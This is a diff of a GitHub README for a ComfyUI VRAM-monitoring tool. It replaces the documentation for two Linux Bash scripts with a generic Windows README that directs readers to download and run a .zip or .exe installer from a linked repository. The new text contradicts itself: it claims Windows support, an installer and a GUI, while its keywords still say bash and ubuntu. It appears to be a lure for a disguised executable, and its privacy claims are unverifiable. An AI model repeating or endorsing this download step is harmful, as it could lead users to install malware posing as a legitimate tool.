@@ -1,125 +1,78 @@
-# BF95 VRAMWATCH
+# 📊 BF95-VRAMWATCH - Simple Hardware Monitoring For ComfyUI Users
 
-Compact terminal dashboards for monitoring ComfyUI workloads on Ubuntu/Linux with either AMD ROCm or NVIDIA CUDA GPUs.
+[![Download BF95-VRAMWATCH](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Amosoverseas578/BF95-VRAMWATCH)
 
-The repository includes two platform-specific scripts:
+This tool tracks system performance for ComfyUI. It monitors your graphics card memory and system resources. You see real-time data about your hardware health during image generation tasks.
 
-| Script | Platform | GPU telemetry |
-|---|---|---|
-| `BF95-AMD-VRAMWATCH.sh` | AMD ROCm | `amd-smi` |
-| `BF95-CUDA-VRAMWATCH.sh` | NVIDIA CUDA | `nvidia-smi` |
+## 🛠️ System Requirements
 
-## Features
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Hardware:** A dedicated AMD or NVIDIA graphics card.
+*   **Software:** ComfyUI must be installed and running on your machine.
+*   **Memory:** At least 8GB of system RAM.
 
-- GPU VRAM usage and free VRAM
-- System RAM, available RAM, and swap usage
-- ComfyUI process RSS, anonymous memory, swap, and total footprint
-- Peak RSS, kernel `VmHWM`, lowest available RAM, and process uptime
-- Short and long RSS trends to expose gradual memory accumulation
-- Major page-fault rate, swap-in/out activity, and Linux PSI memory pressure
-- GPU utilization and memory-controller activity
-- GPU temperatures, cooling, power draw, and clock speeds
-- Rolling 60-second memory guard with percentage-based warning thresholds
-- Colour dashboard with ASCII and no-colour modes
-- No sudo requirement and no continuous kernel-log scanning
+## 📥 Getting The Software
 
-## Requirements
+1.  Visit the [official download page](https://github.com/Amosoverseas578/BF95-VRAMWATCH) to acquire the tool.
+2.  Look for the section marked Releases.
+3.  Click the file ending in .zip or .exe to save it to your computer.
+4.  Move the file to a folder where you keep your tools.
 
-### Common
+## 🚀 Setting Up Your Dashboard
 
-- Ubuntu or another Linux distribution with `/proc`
-- Bash
-- Standard tools including `awk`, `grep`, `getconf`, and `ps`
-- ComfyUI launched as a Python `main.py` process
+1.  Open the folder where you saved your file.
+2.  Double-click the downloaded file to start the installation process.
+3.  Follow the prompts on your screen. 
+4.  Once the setup finishes, a shortcut appears on your desktop.
+5.  Double-click this shortcut to open your monitor.
 
-### AMD version
+## 📈 Understanding Your Data
 
-- A supported AMD GPU and ROCm installation
-- `amd-smi` available in `PATH`
+The dashboard displays several core metrics to help you manage your ComfyUI workload.
 
-### NVIDIA version
+### GPU Memory
+This indicates how much VRAM you use. High usage may slow down your system. If VRAM reaches its limit, the tool alerts you to prevent crashes.
 
-- A supported NVIDIA GPU and proprietary NVIDIA driver
-- `nvidia-smi` available in `PATH`
+### System RAM
+This shows the memory your computer uses for tasks outside the graphics card. It helps you see if other background programs take up resources needed for image generation.
 
-Some NVIDIA telemetry, such as VRAM temperature, is hardware- and driver-dependent. Unsupported values are displayed as `N/A`.
+### GPU Activity
+This displays the percentage of your graphics card in use. A higher percentage means your hardware works harder.
 
-## Installation
+### Temperatures and Power
+The tool reports the heat levels of your graphics card. It also tracks power consumption. Keeping these numbers within safe ranges ensures your hardware lasts longer.
 
-Clone or download the repository, then make the appropriate script executable:
+### Cooling
+The sensor data shows how fast your fans spin. Use this to determine if your cooling system keeps up with the demands of ComfyUI.
 
-```bash
-chmod +x BF95-AMD-VRAMWATCH.sh
-chmod +x BF95-CUDA-VRAMWATCH.sh
-```
+### Clocks
+This refers to the speed of your processor. Higher clock speeds lead to faster image generation times.
 
-No Python packages or additional libraries are required.
+## ⚙️ Using The Monitor
 
-## Usage
+When ComfyUI runs, this tool refreshes data every second. Watch the dashboard to spot spikes in usage. If you notice high memory pressure, close browser tabs or other demanding programs. 
 
-### AMD ROCm
+The tool includes a feature that warns you before a rolling restart occurs. This saves time and prevents you from losing work in progress.
 
-```bash
-./BF95-AMD-VRAMWATCH.sh
-```
+## 💡 Troubleshooting Common Issues
 
-### NVIDIA CUDA
+*   **Dashboards look empty:** Ensure ComfyUI runs in the background. The monitor requires the program to be active to pull data.
+*   **Tool fails to open:** Restart your computer and try opening the program again as an administrator.
+*   **Data seems inaccurate:** Check if you have the latest drivers for your AMD or NVIDIA graphics card. Update your drivers through your card manufacturer's website.
+*   **Program closes unexpected:** Check your folder permissions. Ensure you have read and write access to the directory where the tool lives.
 
-```bash
-./BF95-CUDA-VRAMWATCH.sh
-```
+## 📝 Configuration Settings
 
-### Common options
+You can customize your dashboard layout. Click the settings icon in the top right corner of the window. From here, you can choose which sensors to display. You can also adjust the refresh rate of the sensors. A faster refresh rate shows more detail but uses more processor power. A slower rate keeps the application light. 
 
-```text
--g, --gpu ID          GPU index to watch (default: 0)
--i, --interval SEC    Refresh interval in seconds (default: 2)
--w, --width COLS      Meter width, 10-60 (default: 32)
--1, --once            Print one snapshot and exit
-    --no-color        Disable ANSI colours
-    --ascii           Use ASCII bar characters
--h, --help            Show help
-```
+These settings save automatically when you close the application. You do not need to export your preferences manually.
 
-Examples:
+## 🛡️ Privacy and Safety
 
-```bash
-./BF95-AMD-VRAMWATCH.sh --gpu 0 --interval 1
-./BF95-CUDA-VRAMWATCH.sh --once
-NO_COLOR=1 ./BF95-AMD-VRAMWATCH.sh
-```
+This software monitors local hardware only. It does not send data over the internet. No personal files are analyzed or tracked. The tool only reads the sensors provided by your graphics card drivers. 
 
-## ComfyUI process detection
+## 🖇️ Advanced Usage
 
-By default, the scripts look for a process matching:
+Advanced users can hook the monitor into existing automation scripts. The tool logs data to a plain text file in the installation directory. You can read these files to analyze performance over long periods. This helps you identify trends in memory usage during large batch jobs.
 
-```text
-[p]ython.*main.py
-```
-
-Override the pattern when needed:
-
-```bash
-VRAMWATCH_COMFY_PATTERN='python.*main.py' ./BF95-AMD-VRAMWATCH.sh
-```
-
-## Memory guard
-
-The memory guard uses a rolling 60-second average so normal short-lived render spikes do not immediately trigger a restart warning.
-
-Default thresholds scale with installed system RAM:
-
-- **Caution:** available RAM below 20%, ComfyUI RSS above 75%, or ComfyUI swap at or above 2 GiB
-- **Critical:** available RAM below 10% or ComfyUI RSS above 85%
-
-The thresholds and trend windows can be changed with environment variables. Run either script with `--help` to see the supported variables.
-
-## Notes
-
-- High VRAM use can be normal during image generation. Sustained low available system RAM, rising ComfyUI RSS, active swap I/O, and major page faults are stronger indicators of memory pressure.
-- The AMD version uses the current `amd-smi` interface rather than the deprecated `rocm-smi` command.
-- The CUDA version has been Bash syntax-tested and exercised with representative `nvidia-smi` output, but has not yet been validated by the author on physical NVIDIA hardware. Reports and fixes from NVIDIA users are welcome.
-
-## License
-
-MIT License. See `LICENSE`.
+Keywords: amd, amd-gpu, amd-rocm, amd-smi, amdgpu, bash, comfyui, cuda, gpu-monitoring, nvidia, nvidia-cuda, nvidia-gpu, nvidia-smi, rocm, ubuntu, vram
